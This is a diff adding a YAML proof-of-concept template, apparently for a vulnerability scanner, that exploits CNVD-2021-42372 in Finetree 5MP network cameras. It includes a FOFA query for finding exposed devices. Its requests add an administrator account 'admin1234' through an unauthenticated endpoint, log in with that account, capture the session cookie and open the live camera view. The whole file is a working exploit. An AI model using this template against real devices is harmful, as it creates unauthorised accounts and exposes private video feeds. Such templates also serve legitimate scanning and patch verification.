@@ -1,0 +1,37 @@
+id: poc-yaml-finetree-quicksetup-user-add
+info:
+  name: Finetree 5MP 摄像机 user_pop.php 任意用户添加漏洞 CNVD-2021-42372
+  severity: high
+  tags:
+  - 访问控制错误
+  - CNVD-2021-42372
+  finger: Finetree_Network_Camera
+  fofa: app="Finetree-5MP-Network-Camera"
+requests:
+- method: POST
+  path: /quicksetup/user_update.php
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: method=add&user=admin1234&pwd=admin1234&group=2&ptz_enable=0
+  expression: 'body == "200" ||
+
+    body == "804"
+
+    '
+- method: POST
+  path: /
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+  data: user=admin1234&pwd=admin1234&method=login
+  output:
+  - regex_match(headers,`PHPSESSID=(?P<PHPSESSID>.*?);`)
+  expression: 'status_code == 302
+
+    '
+- method: GET
+  path: /live/view.php
+  headers:
+    Cookie: PHPSESSID={{.PHPSESSID}}
+  expression: "status_code == 200 && \ncontains(title,\"Camera\")\n"
+variables: {}
+transport: http
